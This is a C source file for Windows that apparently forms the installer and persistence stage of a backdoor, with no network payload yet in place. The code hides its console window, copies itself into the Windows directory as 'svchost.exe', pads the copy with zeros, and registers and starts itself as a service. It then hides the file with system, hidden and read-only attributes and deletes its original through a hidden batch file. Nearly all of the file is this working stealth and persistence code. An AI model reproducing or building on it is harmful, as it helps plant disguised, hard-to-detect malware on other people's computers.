#include <stdio.h>
#include<WinSock2.h>
#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <wininet.h>
// #include <process.h>

// GCC lwininet ws2_32
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Wininet.lib")
#pragma pack(1)
#pragma warning(disable: 4996) // avoid GetVersionEx to be warnedg
#define S_OK                                   ((HRESULT)0L)
#define S_FALSE                                ((HRESULT)1L)
#define false                                  FALSE
#define true                                   TRUE
#define bool                                   BOOL
#define ERROR_SUCCESS                           0L
#define	HEART_BEAT_TIME		1000 * 60 * 3 // 心跳时间
void WINAPI BDHandler(DWORD dwControl);
void WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv);
char const AUTODELETE[20] = "AUTODELETEOPEN";
char const RELEASE_NAME[20] = "svchost.exe";
char const SERVICEC_NAME[20] = "TestServer";

SECURITY_ATTRIBUTES pipeattr1,pipeattr2; 
HANDLE hReadPipe1,hWritePipe1,hReadPipe2,hWritePipe2; 
SECURITY_ATTRIBUTES saIn, saOut;

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE ServiceStatusHandle;
BOOL CopyF(char* szPath,char *trPath,int bigger){
    if (bigger == 0){
        CopyFile(szPath,trPath,TRUE);
        return TRUE;
    }else{
        HANDLE pFile;
        DWORD fileSize;
        char *buffer;
        DWORD dwBytesRead,dwBytesToRead,tmpLen;
        pFile = CreateFile(szPath,GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if ( pFile == INVALID_HANDLE_VALUE){
            CloseHandle(pFile);
            return FALSE;
        }
        fileSize = GetFileSize(pFile,NULL);
        buffer = (char *) malloc(fileSize);
        ZeroMemory(buffer,fileSize);
        dwBytesToRead = fileSize;
        dwBytesRead = 0;
        ReadFile(pFile,buffer,dwBytesToRead,&dwBytesRead,NULL);
        CloseHandle(pFile);

        HANDLE pFile2;
        DWORD dwBytesWrite,dwBytesToWrite;
        pFile2 = CreateFile(trPath,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,  FILE_ATTRIBUTE_NORMAL,NULL);

        if ( pFile2 == INVALID_HANDLE_VALUE){
            CloseHandle(pFile);
            return FALSE;
        }
        dwBytesToWrite = fileSize;
        dwBytesWrite = 0;
        WriteFile(pFile2,buffer,dwBytesToWrite,&dwBytesWrite,NULL);

        char *blank= (char *) malloc(1024);
        ZeroMemory(blank,1024);
        for(int i = 0;i< bigger;i++){
            WriteFile(pFile2,blank,1024,&dwBytesWrite,NULL);
        }
        free(blank);
        CloseHandle(pFile2);
        free(buffer);

    }
}

void DeleteSelf(char *szPath)
{
    FILE *pFile=NULL;
    pFile=fopen("T.bat","w");
    if(pFile==NULL)
    {
        return;
    }
    char*szBat=(char*)malloc(230);
    printf(szPath);                       
    sprintf(szBat,"del %s\r\n del T.bat",szPath);
    DWORD dwNum = 0;
    fputs(szBat,pFile);
    fclose(pFile);
    free(szBat);
    ShellExecuteA(NULL,"open","T.bat","","",SW_HIDE);
}

void Init(){

    CreateEventA(0,FALSE,FALSE,SERVICEC_NAME);
    while(1){
        
        Sleep(3000);
    }
}

void WINAPI ServiceMain(DWORD dwArgc,  LPTSTR* lpszArgv){
    DWORD dwThreadId;
    // WriteToLog("Running..");
    if (!(ServiceStatusHandle = RegisterServiceCtrlHandler(SERVICEC_NAME,
                     BDHandler))) return;
    ServiceStatus.dwServiceType  = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwCurrentState  = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted  = SERVICE_ACCEPT_STOP
                      | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwWin32ExitCode        = 0;
    ServiceStatus.dwCheckPoint            = 0;
    ServiceStatus.dwWaitHint              = 0;
    SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    ServiceStatus.dwCheckPoint   = 0;
    ServiceStatus.dwWaitHint     = 0;
    SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
    Init();
}


void WINAPI BDHandler(DWORD dwControl)
{
 switch(dwControl)
 {
    case SERVICE_CONTROL_STOP:
		ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		break;
    case SERVICE_CONTROL_SHUTDOWN:
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		break;
    default:
        break;
 }
}

void ServiceInstall(BOOL auto_delete){
    char  szPath[MAX_PATH];
    char  target[MAX_PATH] ;
    char  tar_path[MAX_PATH];
    char  Direectory[MAX_PATH];

    char  cmd[255];
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    if (OpenEventA(2031619,FALSE,SERVICEC_NAME) != 0 ){
        return ;
    }
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = (char*)SERVICEC_NAME;
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
    StartServiceCtrlDispatcher(ServiceTable); 
    if ( !GetEnvironmentVariable("WINDIR", (LPSTR)target, MAX_PATH) ) return ;
    
    if( !GetModuleFileName( NULL, (LPSTR)szPath, MAX_PATH ) ) return ;
    
    if(!GetCurrentDirectory(MAX_PATH,Direectory)) return ;

    if (strcmp(Direectory,target) != 0 ){

        strcat(target,"\\");
        
        strcat(target,RELEASE_NAME);

        if (!CopyF(szPath,target,3000)){
            CopyFile(szPath,target,TRUE);
        }

        sprintf(cmd,"sc create %s binPath= %s",SERVICEC_NAME,target);
        system(cmd);
        sprintf(cmd,"attrib +s +a +h +r %s",target);
        system(cmd);
        sprintf(cmd,"sc start %s",SERVICEC_NAME);
        system(cmd);
        if (auto_delete)DeleteSelf(szPath);
        
        exit(0);
        return ;
     }
}

int _stdcall WinMain(
    HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPSTR lpCmdLine,
    int nCmdShow
)
{
    
    ServiceInstall(true);
    
    Init();
    return 0;
}
